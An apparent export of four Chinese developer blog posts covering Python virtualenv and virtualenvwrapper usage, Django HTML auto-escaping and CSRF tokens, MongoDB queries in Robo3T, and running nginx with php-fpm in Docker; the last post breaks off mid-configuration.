{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python 虚拟环境 virtualenv", "log_Intro": "Python 虚拟环境 virtualenv", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>virtualenv</h3>\n\n<p>　　Python 今天我们就不聊了。接下来咱们说说virtualenv,英文比较好的同学，可能已经猜到了一半，virtual，即：虚拟的。那env是什么鬼？environment吗？所以翻译成中文就是”虚拟环境“。<br>\n    到底什么是虚拟环境呢？顾名思义，它是一个虚拟出来的环境。通俗的来讲，可以借助虚拟机，docker来理解虚拟环境，就是把一部分内容独立出来，我们把这部分独立出来的东西称作“容器”，在这个容器中，我们可以只安装我们需要的依赖包，而且各个容器之间互相隔离，互不影响。我们要学习Django,我们通过这个环境搞一个Django的虚拟环境就好了。<br><strong>【前提概要】</strong><br>\n    Django也是一个非常流行的web框架。由于Django的迭代更新非常快，也比较频繁，所以有一些过时的东西需要丢弃掉，一些新的东西需要加进来，从而导致不同的版本之间不兼容。比如Django1.3、Django1.4、Django1.8之间就有很大的差异性。<br>\n    或者是说，以Python的版本举例，现在工作中使用的Python版本与Python2.x和Python3.x两种。<br><strong>【故事背景】</strong><br>\n　　假设要进行Python web开发，使用的是Django。手上还有两个老项目A和B需要维护，而新项目C也正在开发中。这里项目A使用的是django1.3，项目B使用的是django1.4，而新项目C使用的是Django1.8。那么问题来了，如何同时在本地进行ABC这三个项目的开发和维护？<br>\n正常的模式可能是这样：现在在A项目上有一个BUG需要修复，于是，先执行下面的命令，删除掉原来的版本：</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>pip uninstall django</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>然后再执行下面的命令安装django1.3</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>pip install django</code><code>=</code><code>=</code><code>1.3</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>数分钟后，bug修复完毕，好，现在进行新项目C的开发了，然后又要重复上面的故事。<br>\n　　好了，这还是最理想的情况。最不理想的情况就是基于django的第三方依赖也是跟Django版本相关的，于是除了install和uninstall Django之外，还要uninstall和install其依赖，Orz，这特么的就尴尬了...</p>\n\n<p><strong>VirtualEnv能做什么呢？</strong></p>\n\n<p>　　VirtualEnv可以搭建虚拟且独立的python运行环境, 使得单个项目的运行环境与其它项目独立起来。同时也可以用于在一台机器上创建多个独立的python运行环境，VirtualEnvWrapper为前者提供了一些便利的命令行上的封装。<br>\n　　Virtualenv是一个非常好的virtual python environment builder，他最大的好处是，可以让每一个python项目单独使用一个环境，而不会影响python系统环境，也不会影响其他项目的环境。<br>\n　　Virtualenv可用于创建独立的Python环境，在这些环境里面可以选择不同的Python版本或者不同的Packages，并且可以在没有root权限的情况下在环境里安装新套件，互相不会产生任何的影响。</p>\n\n<p><strong>言归正传</strong></p>\n\n<p><strong>安装，</strong>virtualenv本质上是个python包, 使用pip安装:</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>pip install virtualenv</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>在工作目录下创建虚拟环境(默认在当前目录)：注意需要自定义虚拟环境的名字！</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>~$virtualenv TestEnv</code></p>\n\n\t\t\t<p><code>New python executable </code><code>in</code> <code>~</code><code>/</code><code>TestEnv</code><code>/</code><code>bin</code><code>/</code><code>python</code></p>\n\n\t\t\t<p><code>Installing setuptools, pip, wheel...done.</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>默认情况下, 虚拟环境中不包括系统的site-packages, 若要使用请添加参数:</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>语法：virtualenv </code><code>-</code><code>-</code><code>system</code><code>-</code><code>site</code><code>-</code><code>packages TestEnv</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>使用virtualenv默认python版本创建虚拟环境</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>语法：virtualenv </code><code>-</code><code>-</code><code>no</code><code>-</code><code>site</code><code>-</code><code>packages ubuntu_env</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>就可以在当前目录创建一个env目录(虚拟环境名称，这个文件夹就是保存 Python 虚拟环境)，你会注意到，virtualenv会把python，setuptools和pip给你安装上。</p>\n\n<p>自定义python版本创建虚拟环境<br>\n　　1. 安装需要版本的python<br>\n　　2. 指定virtualenv中的python版本<br>\n    　　virtualenv --no-site-packages --python=2.7 env</p>\n\n<p><strong>Note：</strong><br>\n　　1. 创建virtualenv虚拟环境之前，系统中必须要安装有对应版本的python，并且卸载之后当前虚拟环境就无效了。系统中可以同时存在python2和python3，通过环境变量中的系统变量path（不是用户变量）控制cmd或者系统中使用哪个版本的python，哪个版本的路径在前面就优先使用哪个版本。<br>\n　　2. –no-site-packages表示不包括系统全局的Python安装包，这样会更令环境更干净<br>\n　　3. –python=python2.7指定Python的版本未系统已经安装了的Python2.7<br>\n　　4. env是建立的虚拟环境名称<br>\n　　5. 没有安装python2.7或者使用命令virtualenv --no-site-packages --python=python2.7 env会出现The executable python does notexist 错误</p>\n\n<p><strong>注意：　</strong></p>\n\n<p>　　安装的库的位置在虚拟环境的 env/Lib/site-packages/目录里，而不是在系统的python的Lib/site-packages目录里，这样你就知道为什么虚拟环境是分开的了吧。<br>\n　　Note ：virtualenv 创建的虚拟环境与主机的 Python 环境完全无关，你主机配置的库不能在 virtualenv 中直接使用。你需要在虚拟环境中利用 pip install 再次安装配置后才能使用。</p>\n\n<p><strong>关于创建一个虚拟环境，你也可以这样做！</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>1</code><code>、为一个工程创建一个虚拟环境：</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$ cd my_project_dir</code></p>\n\n\t\t\t<p><code>$ virtualenv venv　　</code><code>#venv为虚拟环境目录名，目录名自定义</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>　　virtualenv venv 将会在当前的目录中创建一个文件夹，包含了Python可执行文件，以及 pip 库的一份拷贝，这样就能安装其他包了。</code></p>\n\n\t\t\t<p><code>   </code><code>虚拟环境的名字（此例中是 venv ）可以是任意的；若省略名字将会把文件均放在当前目录。</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>　　在任何你运行命令的目录中，这会创建Python的拷贝，并将之放在叫做 venv 的文件中。</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>2</code><code>、你可以选择使用一个Python解释器：</code></p>\n\n\t\t\t<p><code>$ virtualenv </code><code>-</code><code>p </code><code>/</code><code>usr</code><code>/</code><code>bin</code><code>/</code><code>python2.</code><code>7</code> <code>venv　　　　</code><code># -p参数指定Python解释器程序路径</code></p>\n\n\t\t\t<p><code>这将会使用 </code><code>/</code><code>usr</code><code>/</code><code>bin</code><code>/</code><code>python2.</code><code>7</code> <code>中的Python解释器。</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>虚拟环境激活</strong><strong>，若想使用就需要激活创建的虚拟环境！</strong><br>\n进入虚拟环境目录 执行source ./bin/activate激活虚拟环境:</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code># 相对路径方式：&lt;br&gt;~/TestEnv$ source bin/activate</code></p>\n\n\t\t\t<p><code>(TestEnv) ~</code><code>/</code><code>TestEnv$ python </code><code>-</code><code>V</code></p>\n\n\t\t\t<p><code>Python </code><code>2.7</code><code>.</code><code>11</code><code>+</code><code>&lt;br&gt;&lt;br&gt;</code><code># 绝对路径方式</code></p>\n\n\t\t\t<p><code>$ source venv</code><code>/</code><code>bin</code><code>/</code><code>activate　</code><code># 绝对路径</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong> 从现在起，任何你使用pip安装的包将会放在 venv 文件夹中，与全局安装的Python隔绝开。像平常一样安装包，比如：</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>$ pip install requests</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>使用requirements.txt安装版本包(<strong>requirements.txt文件下保存的都是各个依赖包的版本信息</strong>)</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>pip install </code><code>-</code><code>r requirements.txt</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>　　进入环境env1，执行pip freeze &gt; requirements.txt将包依赖信息保存在requirements.txt文件中。<br>\n　　最好手动调整一下顺序，比如numpy和scipy要在matplotlib前面安装；另外如果想安装最新版本的，再将后面的版本号==1.9.1什么的删除。<br>\n　　然后进入目的虚拟环境env2，执行pip install -r requirements.txt，pip就会自动从网上下载并安装所有包。<br>\n　　虚拟环境env2如果是env1的拷贝，最好先pip uninstall -ry requirements.txt，再pip install -r requirements.txt</strong></p>\n\n<p>如果你在虚拟环境中暂时完成了工作，则可以停用它：</p>\n\n<p><strong>退出虚拟环境:</strong></p>\n\n<pre class=\"has\">\n<code># 在环境下，相对退出&lt;br&gt;(TestEnv) ~/TestEnv$ deactivate\n\n~/TestEnv$&lt;br&gt;&lt;br&gt;#走绝对路径&lt;br&gt;$ .venv/bin/deactivate</code></pre>\n\n<p><br><strong>要删除一个虚拟环境，只需删除它的文件夹。</strong>（执行 rm -rf venv ）。这将会回到系统默认的Python解释器，包括已安装的库也会回到默认的。</p>\n\n<p>　　这里virtualenv 有些不便，因为virtual的启动、停止脚本都在特定文件夹，可能一段时间后，你可能会有很多个虚拟环境散落在系统各处，你可能忘记它们的名字或者位置。</p>\n\n<h3>virtualenvwrapper　</h3>\n\n<p>　　鉴于virtualenv不便于对虚拟环境集中管理，所以推荐直接使用virtualenvwrapper。 virtualenvwrapper提供了一系列命令使得和虚拟环境工作变得便利。它把你所有的虚拟环境都放在一个地方。<br>\n1、安装virtualenvwrapper(确保virtualenv已安装)</p>\n\n<pre class=\"has\">\n<code>pip install virtualenvwrapper\n\npip install virtualenvwrapper-win　　#Windows使用该命令</code></pre>\n\n<p>2、安装完成后，在~/.bashrc写入以下内容</p>\n\n<pre class=\"has\">\n<code>export WORKON_HOME=$HOME/.virtualenvs\nsource /usr/local/python3/bin/virtualenvwrapper.sh\nVIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</code></pre>\n\n<pre class=\"has\">\n<code>source ~/.bashrc　　　　#读入配置文件，立即生效</code></pre>\n\n<p>第一行：virtualenvwrapper存放虚拟环境目录 </p>\n\n<p>第二行：virtrualenvwrapper会安装到python的bin目录下，所以该路径是python安装目录下bin/virtualenvwrapper.sh</p>\n\n<h3><strong> virtualenvwrapper基本使用</strong></h3>\n\n<p><strong>1.创建虚拟环境　mkvirtualenv</strong></p>\n\n<pre class=\"has\">\n<code>mkvirtualenv venv</code></pre>\n\n<p>这样会在WORKON_HOME变量指定的目录下新建名为venv的虚拟环境。<br>\n若想指定python版本，可通过\"--python\"指定python解释<br>\n器</p>\n\n<pre class=\"has\">\n<code>mkvirtualenv --python=/usr/local/python3/bin/python venv</code></pre>\n\n<p><strong>2. 基本命令 　</strong><br>\n　　查看当前的虚拟环境目录</p>\n\n<pre class=\"has\">\n<code>[root@localhost ~]# workon\n\npy2\n\npy3</code></pre>\n\n<p>　　切换到虚拟环境</p>\n\n<pre class=\"has\">\n<code>[root@localhost ~]# workon py3\n\n(py3) [root@localhost ~]#</code></pre>\n\n<p>　　退出虚拟环境</p>\n\n<pre class=\"has\">\n<code>(py3) [root@localhost ~]# deactivate\n\n[root@localhost ~]#</code></pre>\n\n<p>　　删除虚拟环境</p>\n\n<pre class=\"has\">\n<code>rmvirtualenv venv</code></pre>\n\n<p> \n</p><h3>使用pycharm自动建立虚拟环境</h3>\n\n\n<p>也可以使用 pycharm 自带功能建立虚拟环境<img alt=\"\" class=\"has\" height=\"184\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODE3NTU4LzIwMTcwOC84MTc1NTgtMjAxNzA4MDMxMDI4NDcyMDktMjA5OTIzMjQ0Ni5wbmc?x-oss-process=image/format,png\" width=\"922\"></p>\n\n<p>之后，将 requirements.txt 文件放到虚拟目录 venv 下，pycharm自动识别，点击『Install requirements』安装相应的 package。</p>\n\n<p><img alt=\"\" class=\"has\" height=\"131\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODE3NTU4LzIwMTcwOC84MTc1NTgtMjAxNzA4MDMxMDI3MjAzNTAtMTQxNDk0NDQzNS5wbmc?x-oss-process=image/format,png\" width=\"920\"></p>\n\n<p>或者使用：</p>\n\n<pre class=\"has\">\n<code class=\"language-html\">(venv) $ pip freeze &gt;requirements.txt    # 生成\n(venv) $ pip install -r requirements.txt    # 安装</code></pre>\n                                    </div>", "log_PostTime": 1584891155, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 模板HTML转义和CSRF4.3", "log_Intro": "Django 模板HTML转义和CSRF4.3", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <ul><li> </li>\n\t<li>Django对字符串进行自动HTML转义，如在模板中输出如下值：</li>\n</ul><pre class=\"has\">\n<code>视图代码：\ndef index(request):\n    return render(request, 'temtest/index2.html',\n                  {\n                      't1': '&lt;h1&gt;hello&lt;/h1&gt;'\n                  })\n模板代码：\n{{t1}}\n</code></pre>\n\n<ul><li>显示效果如下图：</li>\n\t<li><img alt=\"\" class=\"has\" height=\"31\" src=\"https://img-blog.csdnimg.cn/20191006175327217.png\" width=\"121\"></li>\n</ul><p> </p>\n\n<p>会被自动转义的字符</p>\n\n<ul><li>html转义，就是将包含的html标签输出，而不被解释执行，原因是当显示用户提交字符串时，可能包含一些攻击性的代码，如js脚本</li>\n\t<li>Django会将如下字符自动转义：</li>\n</ul><pre class=\"has\">\n<code>&lt; 会转换为&amp;lt;\n\n&gt; 会转换为&amp;gt;\n\n' (单引号) 会转换为&amp;#39;\n\n\" (双引号)会转换为 &amp;quot;\n\n&amp; 会转换为 &amp;amp;\n</code></pre>\n\n<ul><li>当显示不被信任的变量时使用escape过滤器，一般省略，因为Django自动转义</li>\n</ul><pre class=\"has\">\n<code>{{t1|escape}}\n</code></pre>\n\n<p>关闭转义</p>\n\n<ul><li>对于变量使用safe过滤器</li>\n</ul><pre class=\"has\">\n<code>{{ data|safe }}\n</code></pre>\n\n<ul><li>对于代码块使用autoescape标签</li>\n</ul><pre class=\"has\">\n<code>{ % autoescape off %}\n{{ body }}\n{ % endautoescape %}\n</code></pre>\n\n<ul><li>标签autoescape接受on或者off参数</li>\n\t<li>自动转义标签在base模板中关闭，在child模板中也是关闭的</li>\n</ul><p>字符串字面值</p>\n\n<ul><li>手动转义</li>\n</ul><pre class=\"has\">\n<code>{ { data|default:\"&lt;b&gt;123&lt;/b&gt;\" }}\n</code></pre>\n\n<ul><li>应写为</li>\n</ul><pre class=\"has\">\n<code>{ { data|default:\"&amp;lt;b&amp;gt;123&amp;lt;/b&amp;gt;\" }}</code></pre>\n\n<h1 id=\"csrf\">csrf</h1>\n\n<ul><li>全称Cross Site Request Forgery，跨站请求伪造</li>\n\t<li>某些恶意网站上包含链接、表单按钮或者JavaScript，它们会利用登录过的用户在浏览器中的认证信息试图在你的网站上完成某些操作，这就是跨站攻击</li>\n\t<li>演示csrf如下</li>\n\t<li>创建视图csrf1用于展示表单，csrf2用于接收post请求</li>\n</ul><pre class=\"has\">\n<code>def csrf1(request):\n    return render(request,'booktest/csrf1.html')\ndef csrf2(request):\n    uname=request.POST['uname']\n    return render(request,'booktest/csrf2.html',{'uname':uname})\n</code></pre>\n\n<ul><li>配置url</li>\n</ul><pre class=\"has\">\n<code>url(r'^csrf1/$', views.csrf1),\nurl(r'^csrf2/$', views.csrf2),\n</code></pre>\n\n<ul><li>创建模板csrf1.html用于展示表单</li>\n</ul><pre class=\"has\">\n<code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form method=\"post\" action=\"/crsf2/\"&gt;\n    &lt;input name=\"uname\"&gt;&lt;br&gt;\n    &lt;input type=\"submit\" value=\"提交\"/&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<ul><li>创建模板csrf2用于展示接收的结果</li>\n</ul><pre class=\"has\">\n<code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n{{ uname }}\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<ul><li>在浏览器中访问，查看效果，报错如下：</li>\n</ul><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191006175607778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<ul><li>将settings.py中的中间件代码'django.middleware.csrf.CsrfViewMiddleware'注释</li>\n\t<li>查看csrf1的源代码，复制，在自己的网站内建一个html文件，粘贴源码，访问查看效果</li>\n</ul><p>防csrf的使用</p>\n\n<ul><li>在django的模板中，提供了防止跨站攻击的方法，使用步骤如下：</li>\n\t<li>step1：在settings.py中启用'django.middleware.csrf.CsrfViewMiddleware'中间件，此项在创建项目时，默认被启用</li>\n\t<li>step2：在csrf1.html中添加标签</li>\n</ul><pre class=\"has\">\n<code>&lt;form&gt;\n{% csrf_token %}\n...\n&lt;/form&gt;\n</code></pre>\n\n<ul><li>step3：测试刚才的两个请求，发现跨站的请求被拒绝了，效果如下图</li>\n</ul><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191006175632481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>取消保护</p>\n\n<ul><li>如果某些视图不需要保护，可以使用装饰器csrf_exempt，模板中也不需要写标签，修改csrf2的视图如下</li>\n</ul><pre class=\"has\">\n<code>from django.views.decorators.csrf import csrf_exempt\n\n@csrf_exempt\ndef csrf2(request):\n    uname=request.POST['uname']\n    return render(request,'booktest/csrf2.html',{'uname':uname})\n</code></pre>\n\n<ul><li>运行上面的两个请求，发现都可以请求</li>\n</ul><p>保护原理</p>\n\n<ul><li>加入标签后，可以查看源代码，发现多了如下代码</li>\n</ul><pre class=\"has\">\n<code>&lt;input type='hidden' name='csrfmiddlewaretoken' value='nGjAB3Md9ZSb4NmG1sXDolPmh3bR2g59' /&gt;\n</code></pre>\n\n<ul><li>在浏览器的调试工具中，通过network标签可以查看cookie信息</li>\n\t<li>本站中自动添加了cookie信息，如下图</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"85\" src=\"https://img-blog.csdnimg.cn/20191006175653815.png\" width=\"530\"></p>\n\n<p> </p>\n\n<ul><li>查看跨站的信息，并没有cookie信息，即使加入上面的隐藏域代码，发现又可以访问了</li>\n\t<li>结论：django的csrf不是完全的安全</li>\n\t<li>当提交请求时，中间件'django.middleware.csrf.CsrfViewMiddleware'会对提交的cookie及隐藏域的内容进行验证，如果失败则返回403错误</li>\n</ul><p> </p>\n                                    </div>", "log_PostTime": 1584891157, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Robo3T使用小结", "log_Intro": "Robo3T使用小结", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>1，设置时间显示</h3>\n\n<p>在未设置前数据内的时间数都比当前时间少8小时。比如2019-2-27 15:00,在MongoDB里面时间就是2019-2-27 7:00<br>\n设置很简单，点击Options==&gt;Display Date In...==&gt;将UTC改为Local Timezone即可</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yODM5MzE3LTQyMDNhMDAxODdmNWZjZWMucG5n?x-oss-process=image/format,png\"></p>\n\n<p>右上角这个长条请忽略</p>\n\n<h3>2，查询等于</h3>\n\n<p><code>db.getCollection('lessons').find({is_online:1})</code></p>\n\n<p>大于等于<br><code>db.getCollection('lessons').find({\"scheduled_at:{$gte:ISODate(\"2019-01-07T02:00:00.000Z\")}})</code></p>\n\n<p>小于等于<br><code>$lte:ISODate(\"2019-01-07T02:00:00.000Z\")</code></p>\n\n<p>大于或小于，就把后面的e去掉，即：<strong>lt gt</strong></p>\n\n<h3>3，查询表里的数据条数</h3>\n\n<p><code>db.getCollection('curriculums').find({}).count();</code><br>\n即，后面加上 .count()</p>\n\n<h3>4，col 集合中的数据按字段 likes 的降序排列：</h3>\n\n<p><code>db.col.find({}).sort({\"likes\":-1})</code></p>\n\n<h3>5，update数据</h3>\n\n<p>db.courses.updateMany(<br>\n{ \"cid\" : \"5bc562345dbd0e4618aa9484\"},<br>\n{ set:{字段名:数值}}<br>\n)</p>\n\n<h3>6，查询字段内的字段</h3>\n\n<p>数据内的字段是这样的，很多数据里是多个学生，这里就想查询包含学生id是34的：</p>\n\n<pre class=\"has\">\n<code>\"teachers\" : [ \n        1.0, \n        2.0, \n        3.0\n    ],\n    \"students\" : [ \n        {\n            \"id\" : 8,\n            \"name\" : \"测试学生3\",\n            \"age\" : 8,\n            \"sex\" : \"male\",\n            \"region\" : \"上海\"\n        }\n    ]\n</code></pre>\n\n<p>想要查出id是34的数据<br><code>db.getCollection('classes').find({\"students.id\":34})</code></p>\n\n<p>刚还尝试的一个方式是：全文检索<br>\nMongoDB 在 2.6 版本以后是默认开启全文检索的，如果你使用之前的版本，你需要使用以下代码来启用全文检索:<br>\ndb.adminCommand({setParameter:true,textSearchEnabled:true})<br>\n对 post_text 字段建立全文索引<br>\ndb.posts.ensureIndex({post_text:\"text\"})</p>\n\n<hr><p>db.getCollection('classes').ensureIndex({students:\"text\"})<br>\n对students字段建立全文索引<br>\n使用全文索引<br>\ndb.posts.find({$text:{$search:\"runoob\"}})</p>\n\n<hr><p>db.getCollection('classes').find({$text:{$search:\"23401\"}})<br>\n搜索内容不对<br>\n,可能的原因是id是int类型。全文索引是针对string类型的。</p>\n\n<h3>7，模糊查询</h3>\n\n<p>sql:<br><code>select * from user where name like \"%花%\";</code></p>\n\n<p>mongo:</p>\n\n<p><code>db.user.find(name:/花/);</code></p>\n\n<p>例子：查看students里的name包含 ”测试“ 的数据。<br><code>db.getCollection('classes').find({\"students.name\":/测试/})</code><br>\n若是以a为开头的：<br><code>db.getCollection('classes').find({\"students.name\":/^测试/})</code></p>\n\n<h3>8,数组查询</h3>\n\n<p>实例，一节课的老师的id可能有多个，这样：<br>\n\"teachers\" : [ 391, 659, 1534 ]<br>\n需求：查询包含老师id为1534的所有的数据<br>\n很简单~<br><code>db.getCollection('classes').find({teachers:1534})</code></p>\n\n<h3>9，查询只显示部分字段</h3>\n\n<p>classes表中只显示id和title两个字段<br>\n下面的 <code>status:\"700\"</code> 为查询条件<br><code>db.getCollection('classes').find({status:\"700\"},{_id:1,title:1})</code></p>\n\n<h3>10,给数组追加一个数据</h3>\n\n<p>需求：给数据内的老师id多加一个1534，即让老师多一节课,如果已经存在了就不添加了。</p>\n\n<p><code>db.getCollection('classes').update({\"_id\" : ObjectId(\"5bc995e391e99773f9096114\")},{$addToSet:{ \"teachers\":NumberInt(1539)}})</code><br>\n这里使用的是<code>$addToSet</code></p>\n\n<p>添加2个数据。需要和<code>$each</code>配合<br><code>db.getCollection('classes').update({\"_id\" : ObjectId(\"5bc995e391e99773f9096114\")},{$addToSet:{ \"teachers\":{$each:[NumberInt(11232),NumberInt(2800)]}})</code></p>\n\n<h3>11,查询一个字段为不同值的时候</h3>\n\n<p>需求：title为‘K2D23’或‘K2D41’或’S1050‘的数据<br><code>db.getCollection('classes').find({title:{$in:['K2D23','K2D41','S1050']}})</code><br>\n这里使用的是$in</p>\n\n<h3>12,更多网站</h3>\n\n<p><a href=\"http://flamepeak.com/2016/10/25/MongoDB-learning-part3-20161025/\" rel=\"nofollow\">MongoDB 学习笔记(三)：查询</a><br>\n这个文章看了，就发现查询里，还有很多内容的。</p>\n                                    </div>", "log_PostTime": 1584891158, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "使用Docker快速搭建PHP开发环境", "log_Intro": "使用Docker快速搭建PHP开发环境", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>一般我们会把nginx、php都安装在同一个容器，为了扩展方便，我们希望nginx容器和php容器分开。那么就可以使用docker link命令实现这一目的。</p>\n\n<p>需要的镜像：</p>\n\n<ul><li>nginx 1.12.2</li>\n\t<li>php(含php-fpm7.1) 7.1</li>\n</ul><p>这里nginx镜像选择<code>daocloud.io/library/nginx:1.12.2-alpine</code>，php镜像自行编译（选用的是 <a href=\"https://github.com/52fhy/docker-images\">https://github.com/52fhy/docker-images</a> 里的<code>php56-fpm-centos68-withext</code>和<code>php71-fpm-centos68-phalcon-withext</code>）。</p>\n\n<h2 id=\"autoid-0-0-0\">实践</h2>\n\n<p>运行 php-fpm ：</p>\n\n<p><code id=\"copy_target_0\">docker run -d --restart=always --name yphp \\ -v /work/:/work/ \\ -v \"/work/yphp/php/etc/\":/usr/local/php/etc/ \\ php71-fpm-centos68-phalcon-withext</code></p>\n\n<p><code>--restart=always</code> 使得容器开机随着docker服务自行启动。<code>-v</code>指定宿主机和容器的目录映射关系。</p>\n\n<p>这里的<code>/work/yphp</code>来自 <a href=\"https://github.com/52fhy/yphp\">https://github.com/52fhy/yphp</a> 。</p>\n\n<p><code>/work</code>里面包含的子目录：</p>\n\n<p><code id=\"copy_target_1\">/work |-- www |---yphp</code></p>\n\n<p><code>/www</code>是项目目录，<code>yphp</code>是nginx和php配置目录，映射到容器，方便本地修改。</p>\n\n<p>运行 nginx ：</p>\n\n<p><code id=\"copy_target_2\">docker run -d --restart=always --name some-nginx -p 80:80 --link yphp:yphp \\ -v /work/:/work/ \\ -v /work/yphp/nginx/conf/:/etc/nginx/ \\ -v /work/yphp/nginx/logs/:/etc/nginx/logs/ \\ daocloud.io/library/nginx:1.12.2-alpine</code></p>\n\n<p>选用<code>nginx:1.12.2-alpine</code>是因为该镜像非常小。</p>\n\n<p>命令不是很多，但是有很多注意点，必须仔细查看，否则可能导致服务不正常：</p>\n\n<p>1、对于php-fpm容器来说，php-fpm的www.conf配置文件里，监听的IP导致不能是127.0.0.1，必须是0.0.0.0；否则会导致后续nginx这边出现404（<a href=\"https://segmentfault.com/q/1010000006148224/a-1020000013359135\" rel=\"nofollow\">查看问题</a>）。</p>\n\n<p><code id=\"copy_target_3\">;listen = 127.0.0.1:9000 listen = 0.0.0.0:9000</code></p>\n\n<p>2、nginx容器必须使用<code>--link</code>连接到php-fpm容器。<br>\n3、nginx容器和php-fpm容器的www目录必须是一致的。<br>\n4、nginx容器配置fastcgi_pass的时候需要修改为<code>--link</code>里的名称(实际为主机名称，会在nginx容器的<code>/etc/hosts</code>新增一条主机记录)。<br>\n5、如果nginx容器需要支持更多端口访问，那么使用<code>-p</code>范围表示，示例：<code>-p 80-90:80-90</code>。或者多个<code>-p</code>参数。<br>\n6、<code>-v</code>参数指定的本地挂载目录(示例里的<code>/work</code>)子目录(例如<code>/www</code>)在宿主机不能是软链接，否则会导致nginx 404，因为软链接在容器里是无效的。但是<code>/work</code>本身可以是软链接。</p>\n\n<p>nginx配置：<br>\nhello.cc.conf</p>\n\n<p><code id=\"copy_target_4\">server { listen 80; server_name hello.cc; access_log logs/access.log; error_log logs/error.log; root /work/yphp/php/; index index.php index.html index.htm; location ~ \\.php$ { #fastcgi_pass 